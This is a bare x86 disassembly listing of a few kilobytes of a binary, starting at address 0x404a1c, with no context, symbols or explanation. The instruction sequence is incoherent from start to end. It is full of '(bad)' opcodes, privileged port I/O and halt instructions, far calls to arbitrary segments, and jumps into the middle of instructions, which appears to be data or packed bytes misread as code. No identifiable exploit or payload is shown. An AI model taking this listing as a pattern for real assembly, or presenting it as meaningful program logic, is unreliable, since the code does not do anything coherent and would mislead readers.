  404a1c:	pushf  
  404a1d:	inc    esi
  404a1e:	pop    ss
  404a1f:	out    dx,eax
  404a20:	push   esi
  404a21:	cs sahf 
  404a23:	aas    
  404a24:	push   eax
  404a25:	push   ebp
  404a26:	ret    0xf084
  404a29:	or     bl,BYTE PTR ds:0x84aff77c
  404a2f:	inc    eax
  404a30:	add    eax,0x40667681
  404a35:	adc    al,0xf4
  404a37:	adc    eax,0x1a300cb1
  404a3c:	xor    BYTE PTR [edx+0x67],ch
  404a3f:	(bad)  [esi+0x1b]
  404a42:	push   eax
  404a43:	lods   al,BYTE PTR ds:[esi]
  404a44:	push   esp
  404a45:	sar    DWORD PTR [eax+0x4e],cl
  404a48:	pushf  
  404a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a4a:	pop    edi
  404a4b:	cli    
  404a4c:	or     eax,0x1bf5b1ba
  404a51:	mov    fs,eax
  404a53:	dec    edx
  404a54:	xor    eax,0x37904581
  404a59:	es dec esi
  404a5b:	ja     0x404ac1
  404a5d:	les    esp,FWORD PTR [edx+edi*4-0x32]
  404a61:	sbb    DWORD PTR [edi],ecx
  404a63:	test   DWORD PTR [ecx+ebx*2],0x9ac3d9f9
  404a6a:	cmc    
  404a6b:	and    al,0x13
  404a6d:	jle    0x404aa2
  404a6f:	inc    ebp
  404a70:	inc    ebp
  404a71:	in     al,0x18
  404a73:	jbe    0x404a16
  404a75:	cdq    
  404a76:	dec    ebp
  404a77:	ficom  WORD PTR [esi+0x2c]
  404a7a:	jo     0x404a66
  404a7c:	rcr    cl,cl
  404a7e:	lea    ebp,[eax]
  404a80:	or     dl,BYTE PTR [ebp-0x4f]
  404a83:	sbb    al,0xb
  404a85:	cmp    eax,0x758cc1fa
  404a8a:	lea    esi,[edx]
  404a8c:	jnp    0x404ace
  404a8e:	push   ecx
  404a8f:	test   DWORD PTR [ebx],esi
  404a91:	cmp    ebx,DWORD PTR [eax-0x5711280c]
  404a97:	and    eax,eax
  404a99:	(bad)  
  404a9a:	xor    bh,ch
  404a9c:	das    
  404a9d:	pop    edx
  404a9e:	mul    esp
  404aa0:	mov    edi,0xb3e29bbe
  404aa5:	outs   dx,BYTE PTR ds:[esi]
  404aa6:	xor    dl,ch
  404aa8:	inc    eax
  404aa9:	mov    esi,DWORD PTR [ebx-0x1c]
  404aac:	ror    DWORD PTR [edx-0x8219a23],cl
  404ab2:	or     DWORD PTR [edx+eax*1-0x37a1338b],0xffffff8a
  404aba:	push   edi
  404abb:	addr16 push ss
  404abd:	jnp    0x404ab0
  404abf:	jne    0x404b2b
  404ac1:	shl    BYTE PTR [ebx+esi*8+0x59],1
  404ac5:	mov    dl,0xfc
  404ac7:	mov    al,ds:0x667492d4
  404acc:	and    al,0x29
  404ace:	fld    st(1)
  404ad0:	in     eax,0x55
  404ad2:	jne    0x404aeb
  404ad4:	push   ds
  404ad5:	imul   edi,ecx,0xffffffb6
  404ad8:	pop    esi
  404ad9:	fild   QWORD PTR [ebp-0x8c5dbc]
  404adf:	lds    esi,FWORD PTR [ebx+edx*1]
  404ae2:	or     al,0x62
  404ae4:	or     BYTE PTR [edi],dh
  404ae6:	bound  esi,QWORD PTR [esi+0x5d]
  404ae9:	and    DWORD PTR [eax],edx
  404aeb:	or     DWORD PTR [esp+ebp*1+0x6d],edi
  404aef:	(bad)  
  404af0:	xchg   edi,eax
  404af1:	pop    ds
  404af2:	imul   esp,DWORD PTR [ebx+edx*8-0x28],0x12
  404af7:	sub    al,0xb3
  404af9:	test   BYTE PTR [ebx-0x64c16320],cl
  404aff:	xchg   edi,eax
  404b00:	jnp    0x404a8b
  404b02:	adc    al,0x28
  404b04:	jg     0x404af1
  404b06:	stos   DWORD PTR es:[edi],eax
  404b07:	(bad)  
  404b08:	les    edx,FWORD PTR [ecx]
  404b0a:	mov    ecx,0x3d89d3b7
  404b0f:	test   BYTE PTR [ebx],bh
  404b11:	scas   al,BYTE PTR es:[edi]
  404b12:	repnz push ss
  404b14:	fcmove st,st(5)
  404b16:	sbb    eax,0xd7466cc6
  404b1b:	mov    es,ebx
  404b1d:	dec    edx
  404b1e:	fdivr  QWORD PTR [ecx]
  404b20:	push   0x31557af5
  404b25:	inc    ecx
  404b26:	add    BYTE PTR [edi-0x2f],al
  404b29:	shr    esi,0x13
  404b2c:	cs push ecx
  404b2e:	mov    dl,0xd0
  404b30:	jg     0x404b66
  404b32:	cmp    BYTE PTR [edx+edi*4],dh
  404b35:	jns    0x404b75
  404b37:	cli    
  404b38:	leave  
  404b39:	push   eax
  404b3a:	shl    esi,cl
  404b3c:	ret    0x56bd
  404b3f:	shr    ebp,0xcd
  404b42:	mov    dh,BYTE PTR [esi+0x4760284f]
  404b48:	jecxz  0x404aed
  404b4a:	sbb    BYTE PTR [esi+edx*8],dh
  404b4d:	xchg   ecx,eax
  404b4e:	cld    
  404b4f:	fcmovu st,st(3)
  404b51:	std    
  404b52:	push   eax
  404b53:	jecxz  0x404ad9
  404b55:	dec    esp
  404b56:	shr    DWORD PTR [eax+0x78],0x90
  404b5a:	mov    bh,0xec
  404b5c:	jmp    0x404b79
  404b5e:	add    eax,0xd78d02a4
  404b63:	mov    edx,0xd9d8035
  404b68:	add    DWORD PTR [eax+0x6d],esp
  404b6b:	mov    dh,0x1f
  404b6d:	ror    DWORD PTR [edi-0x612ff69d],0xcb
  404b74:	test   al,0x2f
  404b76:	lds    edi,FWORD PTR [ebp+0x2c]
  404b79:	mov    ebp,0x917f062f
  404b7e:	jl     0x404b76
  404b80:	push   cs
  404b81:	adc    al,0xa1
  404b83:	rcr    DWORD PTR [edi-0x41],1
  404b86:	or     ebp,ecx
  404b88:	mov    ds:0xe8e3ab5e,al
  404b8d:	add    al,0xa6
  404b8f:	add    al,0x6e
  404b91:	xchg   BYTE PTR [esi-0xd],al
  404b94:	jb     0x404b70
  404b96:	and    ah,BYTE PTR [esi-0x4e7b4b1e]
  404b9c:	xchg   edi,eax
  404b9d:	inc    esp
  404b9e:	rcl    al,0x40
  404ba1:	mov    DWORD PTR [eax],edi
  404ba3:	sub    BYTE PTR [edx-0x41da3138],bh
  404ba9:	int    0x4b
  404bab:	mov    esp,DWORD PTR [edx-0x69]
  404bae:	cmp    bh,BYTE PTR [eax]
  404bb0:	fst    DWORD PTR [ecx-0xcce9326]
  404bb6:	(bad)  
  404bb7:	jl     0x404b7e
  404bb9:	(bad)  
  404bba:	jnp    0x404b3c
  404bbc:	cmp    BYTE PTR [eax],0x4e
  404bbf:	ins    BYTE PTR es:[edi],dx
  404bc0:	xor    al,0x83
  404bc2:	lea    ecx,[ebx+0xf6d3e2c]
  404bc8:	ja     0x404b6a
  404bca:	sahf   
  404bcb:	lock jecxz 0x404bd0
  404bce:	rcl    ebx,0x11
  404bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd2:	enter  0x3892,0x92
  404bd6:	repnz mov ds:0x6d77fd5,eax
  404bdc:	cmp    eax,0xef6dc96a
  404be1:	clc    
  404be2:	push   edx
  404be3:	dec    esp
  404be4:	repnz stos BYTE PTR es:[edi],al
  404be6:	mov    edi,0x793f4f62
  404beb:	mov    dl,0xb0
  404bed:	xor    esp,eax
  404bef:	fisttp DWORD PTR [edx*8+0x344f7dfc]
  404bf6:	jg     0x404bb7
  404bf8:	sti    
  404bf9:	es jp  0x404bb2
  404bfc:	scas   al,BYTE PTR es:[edi]
  404bfd:	mov    ebp,edx
  404bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c00:	call   0xd61b:0x24b10363
  404c07:	add    esp,esi
  404c09:	frndint 
  404c0b:	push   ecx
  404c0c:	clc    
  404c0d:	pop    ebx
  404c0e:	(bad)  
  404c0f:	fbstp  TBYTE PTR [esi]
  404c11:	aad    0x8d
  404c13:	pop    esi
  404c14:	xlat   BYTE PTR ds:[ebx]
  404c15:	adc    DWORD PTR [esi+0x5a4b87fa],esp
  404c1b:	loopne 0x404bb3
  404c1d:	sti    
  404c1e:	rcr    DWORD PTR [ebx],cl
  404c20:	pop    ebp
  404c21:	shl    BYTE PTR [eax+edi*8-0x39],cl
  404c25:	dec    esi
  404c26:	dec    ebx
  404c27:	(bad)  
  404c28:	test   eax,0x23e0cdd5
  404c2d:	mov    al,ds:0xb57b9e8d
  404c32:	cli    
  404c33:	leave  
  404c34:	dec    eax
  404c35:	xlat   BYTE PTR ds:[ebx]
  404c36:	fisttp WORD PTR [esi+esi*1]
  404c39:	push   ecx
  404c3a:	mov    al,0x13
  404c3c:	ret    
  404c3d:	and    eax,0x45d2eb61
  404c42:	mov    esp,0x5c9686ae
  404c47:	ds jecxz 0x404ca0
  404c4a:	mov    DWORD PTR [eax+0x1612f735],ebx
  404c50:	in     al,0x3
  404c52:	call   0x25bb3abc
  404c57:	push   ds
  404c58:	jl     0x404c20
  404c5a:	(bad)  
  404c5b:	push   esp
  404c5c:	std    
  404c5d:	into   
  404c5e:	imul   ecx,DWORD PTR [ebp-0x5f26fd10],0xffffff89
  404c65:	fist   WORD PTR [esi-0x5b]
  404c68:	(bad)  
  404c69:	sti    
  404c6a:	and    esp,ebx
  404c6c:	or     ah,cl
  404c6e:	lea    edi,[ecx+0x425dc643]
  404c74:	dec    esp
  404c75:	popa   
  404c76:	popa   
  404c77:	ret    0xb0d5
  404c7a:	cwde   
  404c7b:	pop    ebp
  404c7c:	shl    DWORD PTR [edi],0x5
  404c7f:	adc    al,0xb3
  404c81:	test   BYTE PTR [eax],0xf2
  404c84:	mov    esi,0x4c4f7fc7
  404c89:	test   eax,0xcfcbd767
  404c8e:	xchg   dl,ah
  404c90:	xor    eax,ebp
  404c92:	mov    bl,bl
  404c94:	fwait
  404c95:	push   es
  404c96:	jge    0x404c99
  404c98:	sub    edi,DWORD PTR [edi+0xb]
  404c9b:	in     eax,0x55
  404c9d:	scas   al,BYTE PTR es:[edi]
  404c9e:	push   cs
  404c9f:	mov    ebp,0xfe17f0e8
  404ca4:	ror    DWORD PTR ds:0xf6e69b9b,1
  404caa:	pop    edx
  404cab:	mov    dh,0x3c
  404cad:	fsubr  DWORD PTR [eax]
  404caf:	mov    ecx,0xed312eff
  404cb4:	xlat   BYTE PTR ds:[ebx]
  404cb5:	js     0x404c8d
  404cb7:	ret    
  404cb8:	mov    dh,0x8b
  404cba:	dec    edx
  404cbb:	or     al,0x65
  404cbd:	and    BYTE PTR [ebp+0x499a35e6],ch
  404cc3:	stos   BYTE PTR es:[edi],al
  404cc4:	aaa    
  404cc5:	sbb    BYTE PTR ds:0x6625f203,0x20
  404ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ccd:	cld    
  404cce:	xor    BYTE PTR [ecx-0x37230526],bl
  404cd4:	add    DWORD PTR ss:[ebx],edi
  404cd7:	popf   
  404cd8:	ret    
  404cd9:	ins    DWORD PTR es:[edi],dx
  404cda:	mov    ch,0xed
  404cdc:	test   BYTE PTR [edi],bh
  404cde:	pop    esi
  404cdf:	aaa    
  404ce0:	mov    ebp,0x51ecfb43
  404ce5:	sub    al,al
  404ce7:	data16 loopne 0x404cfd
  404cea:	data16 addr16 repz adc al,0xd5
  404cef:	jmp    0x404d23
  404cf1:	sti    
  404cf2:	push   esi
  404cf3:	xchg   ebp,eax
  404cf4:	cmp    DWORD PTR [edi-0x79],eax
  404cf7:	adc    esi,eax
  404cf9:	pop    ebx
  404cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cfb:	mov    ch,0x97
  404cfd:	or     eax,0x409fd5a5
  404d02:	lock sbb al,0xe
  404d05:	push   edx
  404d06:	jne    0x404d66
  404d08:	aas    
  404d09:	les    ecx,FWORD PTR [edx]
  404d0b:	scas   al,BYTE PTR es:[edi]
  404d0c:	jg     0x404cde
  404d0e:	rcl    ecx,0xc1
  404d11:	daa    
  404d12:	jg     0x404cdb
  404d14:	in     al,0xf4
  404d16:	add    eax,0xd708450
  404d1b:	mov    edi,0x8a50a064
  404d20:	and    DWORD PTR [ebx-0x56ce429a],esp
  404d26:	mov    DWORD PTR [ecx-0x22fe6023],ebp
  404d2c:	cmp    ebp,esp
  404d2e:	mov    dl,0x1d
  404d30:	xor    esp,DWORD PTR [esi]
  404d32:	inc    eax
  404d33:	xchg   edi,eax
  404d34:	jg     0x404cc8
  404d36:	or     edi,DWORD PTR [edi-0x2]
  404d39:	adc    ecx,DWORD PTR [edi-0x4e]
  404d3c:	(bad)  
  404d3d:	adc    dl,BYTE PTR [edi]
  404d3f:	xchg   BYTE PTR [ecx+0x4c],dl
  404d42:	leave  
  404d43:	(bad)  
  404d44:	sbb    eax,0x54042e0a
  404d49:	cwde   
  404d4a:	pop    eax
  404d4b:	js     0x404d4f
  404d4d:	inc    ecx
  404d4e:	xor    ebp,esi
  404d50:	aaa    
  404d51:	mov    ecx,0x1b3f706c
  404d56:	or     al,0x33
  404d58:	call   0xe31c:0x5bdd365d
  404d5f:	push   0xffffffb2
  404d61:	cli    
  404d62:	repz (bad) 
  404d64:	loop   0x404dca
  404d66:	sbb    edx,ecx
  404d68:	sub    dl,BYTE PTR [edx+0x5b]
  404d6b:	mov    ?,WORD PTR [edi]
  404d6d:	dec    ebp
  404d6e:	ret    0xa3b8
  404d71:	out    dx,al
  404d72:	ss hlt 
  404d74:	push   es
  404d75:	aas    
  404d76:	ja     0x404cfa
  404d78:	mov    ds,WORD PTR [edx]
  404d7a:	push   esi
  404d7b:	jae    0x404d8a
  404d7d:	pop    edi
  404d7e:	push   esi
  404d7f:	aas    
  404d80:	mov    bl,0xfe
  404d82:	imul   eax,DWORD PTR [esi],0x67fa315c
  404d88:	mov    eax,eax
  404d8a:	dec    ebx
  404d8b:	jno    0x404dd5
  404d8d:	int3   
  404d8e:	or     al,0xcc
  404d90:	lock icebp 
  404d92:	dec    esi
  404d93:	int3   
  404d94:	cmp    DWORD PTR [edi+0x33a141a7],ebx
  404d9a:	(bad)  [eax]
  404d9c:	je     0x404e09
  404d9e:	jo     0x404d7f
  404da0:	je     0x404d2d
  404da2:	repnz loopne 0x404d64
  404da5:	ja     0x404dc1
  404da7:	cdq    
  404da8:	jae    0x404d67
  404daa:	sbb    al,0xce
  404dac:	sub    ebx,DWORD PTR [edi+0x1]
  404daf:	and    eax,DWORD PTR [ecx]
  404db1:	mov    edx,0xe337a910
  404db6:	mov    esp,0x7d288ee8
  404dbb:	call   0xa3d5:0xd4ef3b96
  404dc2:	pop    edi
  404dc3:	jp     0x404e27
  404dc5:	(bad)  
  404dc6:	mul    eax
  404dc8:	popf   
  404dc9:	fs jle 0x404db6
  404dcc:	sbb    eax,DWORD PTR [esi-0x72eb0664]
  404dd2:	ror    BYTE PTR [ebx-0x69d68300],0x3a
  404dd9:	push   ebx
  404dda:	cmc    
  404ddb:	aam    0xd4
  404ddd:	push   eax
  404dde:	test   al,0x87
  404de0:	push   edx
  404de1:	push   ebp
  404de2:	mov    al,0x47
  404de4:	and    bh,0x3c
  404de7:	cmp    eax,0x17fccf73
  404dec:	jge    0x404e04
  404dee:	and    eax,0xd21e6836
  404df3:	or     cl,BYTE PTR [esi-0x3a503335]
  404df9:	call   0x31617e05
  404dfe:	lock mov bh,0x6
  404e01:	xor    BYTE PTR [ebx+0x30ad16ca],dh
  404e07:	and    edx,edi
  404e09:	fsub   DWORD PTR [edi+0xef521f1]
  404e0f:	sbb    ecx,DWORD PTR [eax-0x4ef0b4f4]
  404e15:	mov    dl,0x32
  404e17:	shl    BYTE PTR [ebp+eiz*1+0x75050ed0],0xfa
  404e1f:	cmp    edx,DWORD PTR [edi+0x30]
  404e22:	les    eax,FWORD PTR [eax+0x2b]
  404e25:	or     DWORD PTR [esp+ecx*8+0x65],edi
  404e29:	jns    0x404eaa
  404e2b:	lock test BYTE PTR [edx],ch
  404e2e:	adc    cl,BYTE PTR [ecx]
  404e30:	or     ebp,ecx
  404e32:	cwde   
  404e33:	sbb    al,0x1d
  404e35:	push   esi
  404e36:	add    al,0x2b
  404e38:	fisttp QWORD PTR [eax]
  404e3a:	mov    dl,0xfc
  404e3c:	rcr    BYTE PTR [eax+0x27f76fca],cl
  404e42:	ins    DWORD PTR es:[edi],dx
  404e43:	out    dx,al
  404e44:	mov    BYTE PTR [esi],ah
  404e46:	and    eax,0xb4727e3d
  404e4b:	or     ch,cl
  404e4d:	adc    al,0xa9
  404e4f:	or     BYTE PTR [ebp+0x32],dl
  404e52:	xchg   ecx,eax
  404e53:	adc    BYTE PTR [edx-0x58],cl
  404e56:	cli    
  404e57:	add    DWORD PTR [edx+0x5460f3ec],ecx
  404e5d:	fimul  DWORD PTR [edx-0x38]
  404e60:	dec    esp
  404e61:	neg    DWORD PTR [eax+0x6de89781]
  404e67:	xchg   DWORD PTR [eax+esi*8-0x67],ecx
  404e6b:	fcom   QWORD PTR [eax+0x23987004]
  404e71:	xlat   BYTE PTR ds:[ebx]
  404e72:	mov    al,ds:0xd51d40fa
  404e77:	int    0x33
  404e79:	int    0x90
  404e7b:	cwde   
  404e7c:	mov    eax,ds:0x4ff5c408
  404e81:	icebp  
  404e82:	js     0x404e9b
  404e84:	lods   eax,DWORD PTR ds:[esi]
  404e85:	sbb    DWORD PTR [esi-0x16],edx
  404e88:	outs   dx,BYTE PTR ds:[esi]
  404e89:	jno    0x404e93
  404e8b:	ss adc al,0x4c
  404e8e:	sbb    eax,0x1eaba9a0
  404e93:	je     0x404eae
  404e95:	mov    DWORD PTR [eax+ebx*8-0x2e303cb0],edi
  404e9c:	add    eax,0x18306973
  404ea1:	int3   
  404ea2:	jne    0x404efd
  404ea4:	shl    DWORD PTR [ebx],0xc4
  404ea7:	add    ebx,DWORD PTR [ebx]
  404ea9:	ror    DWORD PTR [eax-0x32],1
  404eac:	mov    ds:0x36dc39e9,eax
  404eb1:	loopne 0x404ed2
  404eb3:	cmp    DWORD PTR [ebp+0x65],0x55
  404eb7:	ficom  DWORD PTR [ecx+0x70]
  404eba:	in     eax,dx
  404ebb:	ins    BYTE PTR es:[edi],dx
  404ebc:	xor    eax,0x1105cb82
  404ec1:	cmp    DWORD PTR [ebx-0x3d],ebx
  404ec4:	shr    ebx,cl
  404ec6:	and    al,ch
  404ec8:	stos   BYTE PTR es:[edi],al
  404ec9:	sbb    BYTE PTR [edx],dl
  404ecb:	and    cl,bh
  404ecd:	xchg   edx,eax
  404ece:	sbb    BYTE PTR [edi],0xa5
  404ed1:	sbb    edi,DWORD PTR [ebx+eiz*8-0x67]
  404ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ed6:	sub    BYTE PTR [ebx-0x5fc945a5],cl
  404edc:	pop    ecx
  404edd:	pop    ebp
  404ede:	sti    
  404edf:	daa    
  404ee0:	xchg   edi,eax
  404ee1:	adc    al,0x77
  404ee3:	stos   BYTE PTR es:[edi],al
  404ee4:	mov    al,ds:0x9b44663b
  404ee9:	mov    eax,0x852dc8b3
  404eee:	pop    eax
  404eef:	cmp    al,dh
  404ef1:	ja     0x404f21
  404ef3:	fnstcw WORD PTR [eax-0x3]
  404ef6:	shr    DWORD PTR [ecx],cl
  404ef8:	lea    edi,[esi]
  404efa:	std    
  404efb:	enter  0xcb3d,0xf7
  404eff:	cdq    
  404f00:	shr    bl,cl
  404f02:	retf   0xb854
  404f05:	outs   dx,DWORD PTR ds:[esi]
  404f06:	jae    0x404e99
  404f08:	int    0xab
  404f0a:	fcmovne st,st(6)
  404f0c:	inc    edi
  404f0d:	sub    bl,BYTE PTR [eax+0x4f]
  404f10:	popf   
  404f11:	sub    cl,dh
  404f13:	int    0xb4
  404f15:	xor    BYTE PTR [ebp+0x4156ffd3],ah
  404f1b:	jmp    0xd6245e68
  404f20:	jbe    0x404f33
  404f22:	bound  edx,QWORD PTR [esi+0x1d2bfbf0]
  404f28:	test   DWORD PTR [edi-0x52936ff9],0xa495340e
  404f32:	sbb    esi,ebx
  404f34:	adc    dl,bl
  404f36:	(bad)  
  404f38:	mov    esp,0x518bfb65
  404f3d:	call   0x8b1c:0x19b33080
  404f44:	ret    
  404f45:	mov    al,0x2d
  404f47:	push   es
  404f48:	inc    edx
  404f49:	sub    BYTE PTR [esi-0x41],ch
  404f4c:	call   0x5253:0xcf38ddc6
  404f53:	jmp    0x404edc
  404f55:	jb     0x404fa6
  404f57:	outs   dx,BYTE PTR ds:[esi]
  404f58:	in     eax,dx
  404f59:	imul   esi,DWORD PTR [ecx-0x6b],0x76
  404f5d:	adc    bl,al
  404f5f:	out    0x64,eax
  404f61:	jge    0x404f1b
  404f63:	inc    ebx
  404f64:	xchg   ebp,eax
  404f65:	cli    
  404f66:	dec    esp
  404f67:	mov    BYTE PTR [ebx],0x22
  404f6a:	test   DWORD PTR [eax-0x5d89d8f],ecx
  404f70:	repnz mov ds:0x54ba0eaf,al
  404f76:	loop   0x404fd1
  404f78:	or     al,0x4f
  404f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f7b:	fnsave [edi+0x65]
  404f7e:	and    DWORD PTR [ebp+edi*2-0x3c],esp
  404f82:	mov    bh,0xa5
  404f84:	pushf  
  404f85:	pop    ebp
  404f86:	(bad)  
  404f87:	je     0x405007
  404f89:	pop    es
  404f8a:	fld    TBYTE PTR [ecx-0x7c]
  404f8d:	xor    ebx,DWORD PTR [eax]
  404f8f:	dec    eax
  404f90:	sub    eax,0x5b7deefa
  404f95:	dec    eax
  404f96:	das    
  404f97:	repz pop edi
  404f99:	xchg   edx,eax
  404f9a:	xchg   al,ah
  404f9c:	dec    ecx
  404f9d:	add    BYTE PTR [ecx],dh
  404f9f:	or     DWORD PTR [esi-0x40],ebp
  404fa2:	scas   al,BYTE PTR es:[edi]
  404fa3:	pop    ds
  404fa4:	(bad)  
  404fa5:	mov    edi,0x3986a320
  404faa:	xor    ecx,ebp
  404fac:	fs dec esi
  404fae:	(bad)  [ebx]
  404fb0:	jmp    0x404f3e
  404fb2:	sbb    bh,cl
  404fb4:	cli    
  404fb5:	mov    al,0x72
  404fb7:	pop    ss
  404fb8:	add    BYTE PTR [edi-0x25],dh
  404fbb:	add    al,0xe4
  404fbd:	pop    edi
  404fbe:	push   esp
  404fbf:	jmp    0xb8b6:0xc15f258e
  404fc6:	mov    eax,ds:0x38a4fcef
  404fcb:	jp     0x405009
  404fcd:	enter  0xf750,0x1c
  404fd1:	jns    0x40503b
  404fd3:	test   DWORD PTR [ebp-0x29],0x7aa9a393
  404fda:	or     eax,0x11d0f5b4
  404fdf:	mov    al,ds:0xacb9505e
  404fe4:	or     DWORD PTR [edi+0x4e],esi
  404fe7:	push   esi
  404fe8:	add    esi,DWORD PTR [edx-0x46]
  404feb:	les    esp,FWORD PTR [esi+0x223c8758]
  404ff1:	lock pop esp
  404ff3:	adc    BYTE PTR [eax-0x7a],dh
  404ff6:	jae    0x404f8c
  404ff8:	xchg   BYTE PTR [ecx],cl
  404ffa:	pushf  
  404ffb:	cmp    BYTE PTR [eax-0x57b708b1],0xb8
  405002:	or     al,0xb1
  405004:	stos   DWORD PTR es:[edi],eax
  405005:	xchg   dh,cl
  405007:	sar    DWORD PTR [ecx+eiz*4-0x5],1
  40500b:	sub    dh,ah
  40500d:	loope  0x404fc1
  40500f:	cmp    eax,0x17774127
  405014:	xchg   BYTE PTR [edx+0x7a9d970b],bl
  40501a:	retf   0x27dc
  40501d:	dec    eax
  40501e:	sbb    edx,DWORD PTR [edi]
  405020:	inc    esi
  405021:	inc    eax
  405022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405023:	repnz mov fs,WORD PTR [edx+ebx*1-0x23]
  405028:	xchg   edi,eax
  405029:	dec    eax
  40502a:	pop    ecx
  40502b:	add    DWORD PTR [edx+0x30],eax
  40502e:	mov    ecx,0x5316a8f4
  405033:	js     0x405060
  405035:	mov    es,WORD PTR [ebx-0x5f1dc239]
  40503b:	xchg   ebx,eax
  40503c:	(bad)  
  40503e:	outs   dx,BYTE PTR ds:[esi]
  40503f:	std    
  405040:	nop
  405041:	mov    WORD PTR [esi],ds
  405043:	shr    BYTE PTR [edx],1
  405045:	jmp    0x405061
  405047:	test   al,0x76
  405049:	adc    DWORD PTR [edx-0x441233f2],eax
  40504f:	mov    ecx,?
  405051:	jmp    0x405094
  405053:	xchg   edi,eax
  405054:	cli    
  405055:	jg     0x40502b
  405057:	mov    esp,ebx
  405059:	hlt    
  40505a:	dec    edx
  40505b:	lock imul al
  40505e:	adc    BYTE PTR [esi-0x5f],ah
  405061:	jp     0x4050c4
  405063:	fmul   DWORD PTR [edx+0x27]
  405066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405067:	(bad)  
  405068:	mov    esp,0x269d18d
  40506d:	in     eax,dx
  40506e:	and    ecx,edx
  405070:	or     al,0xd5
  405072:	push   ecx
  405073:	cmc    
  405074:	rcr    DWORD PTR [edi+0x25],cl
  405077:	xchg   ebp,eax
  405078:	push   0xb74b388d
  40507d:	scas   al,BYTE PTR es:[edi]
  40507e:	ins    BYTE PTR es:[edi],dx
  40507f:	pop    ds
  405080:	push   cs
  405081:	adc    eax,0xf19a29df
  405086:	lods   al,BYTE PTR ds:[esi]
  405087:	iret   
  405088:	push   ebp
  405089:	mov    ebx,DWORD PTR [ecx-0x60fdd15c]
  40508f:	or     bh,ch
  405091:	scas   al,BYTE PTR es:[edi]
  405092:	hlt    
  405093:	(bad)  
  405094:	fidiv  WORD PTR [edi]
  405096:	cmp    esp,DWORD PTR [ecx+0x60dced7a]
  40509c:	(bad)  
  40509d:	test   dl,bl
  40509f:	icebp  
  4050a0:	(bad)  
  4050a1:	sbb    eax,0xe866a031
  4050a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050a7:	mov    ebp,0x35c84a0a
  4050ac:	leave  
  4050ad:	hlt    
  4050ae:	sbb    al,0x9e
  4050b0:	test   eax,0xaeb51897
  4050b5:	ret    
  4050b6:	adc    al,0xe5
  4050b8:	lods   eax,DWORD PTR ds:[esi]
  4050b9:	mov    dl,0x1f
  4050bb:	popa   
  4050bc:	mov    ds:0x6fafd0c,ax
  4050c2:	add    BYTE PTR ds:0x801275e3,bl
  4050c8:	stos   BYTE PTR es:[edi],al
  4050c9:	jg     0x405075
  4050cb:	setle  bl
  4050ce:	cmp    BYTE PTR [esi+0x77],bh
  4050d1:	xchg   edx,eax
  4050d2:	jmp    0xfbb6:0x4748d9ef
  4050d9:	clc    
  4050da:	rol    esi,1
  4050dc:	dec    edi
  4050dd:	sub    al,0xda
  4050df:	ret    
  4050e0:	add    eax,0x56ef3609
  4050e5:	mov    BYTE PTR [edx],dl
  4050e7:	aam    0x7e
  4050e9:	int    0x8b
  4050eb:	outs   dx,BYTE PTR ds:[esi]
  4050ec:	add    edx,DWORD PTR [edx-0x4e38acb2]
  4050f2:	jno    0x405138
  4050f4:	jne    0x4050f8
  4050f6:	sahf   
  4050f7:	pop    esp
  4050f8:	cmp    DWORD PTR [eax+0x4b1fc3e1],ebp
  4050fe:	push   ds
  4050ff:	mov    bl,0xe3
  405101:	adc    al,0x7b
  405103:	pop    edi
  405104:	and    eax,DWORD PTR [ebp-0x35e28481]
  40510a:	mov    ecx,0x8516c959
  40510f:	push   ecx
  405110:	cmp    BYTE PTR [ebp-0x2c],ch
  405113:	test   DWORD PTR [ecx-0x4cff541c],ebx
  405119:	ror    BYTE PTR [ebp+eax*4+0x60],cl
  40511d:	arpl   WORD PTR [esi-0x4239d6],dx
  405123:	xor    al,al
  405125:	sub    bl,0x84
  405128:	ja     0x40510a
  40512a:	test   BYTE PTR [edx+0x2af7b4ca],0x60
  405131:	cmp    al,0x1
  405133:	loop   0x405135
  405135:	mov    eax,0x7abcc018
  40513a:	jp     0x405135
  40513c:	addr16 imul ebx
  40513f:	fisttp WORD PTR [eax-0x351a3e3]
  405145:	int3   
  405146:	pop    edi
  405147:	cli    
  405148:	inc    ebp
  405149:	nop
  40514a:	mov    BYTE PTR [ecx+0x1f],dl
  40514d:	xchg   esi,eax
  40514e:	shl    BYTE PTR [ebx],0x7a
  405151:	ins    DWORD PTR es:[edi],dx
  405152:	lea    ecx,[ecx]
  405154:	scas   eax,DWORD PTR es:[edi]
  405155:	xchg   edi,eax
  405156:	(bad)
  405159:	and    dh,BYTE PTR [edi]
  40515b:	push   0x9b8dd9ac
  405160:	hlt    
  405161:	fidivr DWORD PTR [ebp-0x76413e3d]
  405167:	dec    esi
  405168:	jae    0x405111
  40516a:	sbb    al,0x9c
  40516c:	xchg   ebx,eax
  40516d:	leave  
  40516e:	pop    esi
  40516f:	icebp  
  405170:	imul   esp,ebp,0x32
  405173:	and    DWORD PTR [ebp+edi*4+0x41],esp
  405177:	dec    ebx
  405178:	xor    al,0xeb
  40517a:	mov    cl,BYTE PTR [esi]
  40517c:	jmp    0x595c:0xbfbdb3b7
  405183:	adc    dl,0x60
  405186:	jle    0x40517f
  405188:	jmp    0x3042:0x4a385139
  40518f:	ja     0x4051ac
  405191:	cdq    
  405192:	xchg   esi,eax
  405193:	cmp    eax,0xb3955b03
  405198:	lods   al,BYTE PTR ds:[esi]
  405199:	and    DWORD PTR [ebp-0x47e1653a],0xde4bc6d1
  4051a3:	add    ebp,edi
  4051a5:	xchg   edi,eax
  4051a6:	mov    ebx,0xa63104ad
  4051ab:	or     bl,BYTE PTR [ecx+0x5f]
  4051ae:	sahf   
  4051af:	aaa    
  4051b0:	dec    di
  4051b2:	aaa    
  4051b3:	loop   0x4051ad
  4051b5:	dec    edi
  4051b6:	jo     0x4051b8
  4051b8:	mov    ah,0x1c
  4051ba:	inc    edx
  4051bb:	ja     0x405171
  4051bd:	mov    ah,0xff
  4051bf:	xlat   BYTE PTR ds:[ebx]
  4051c0:	icebp  
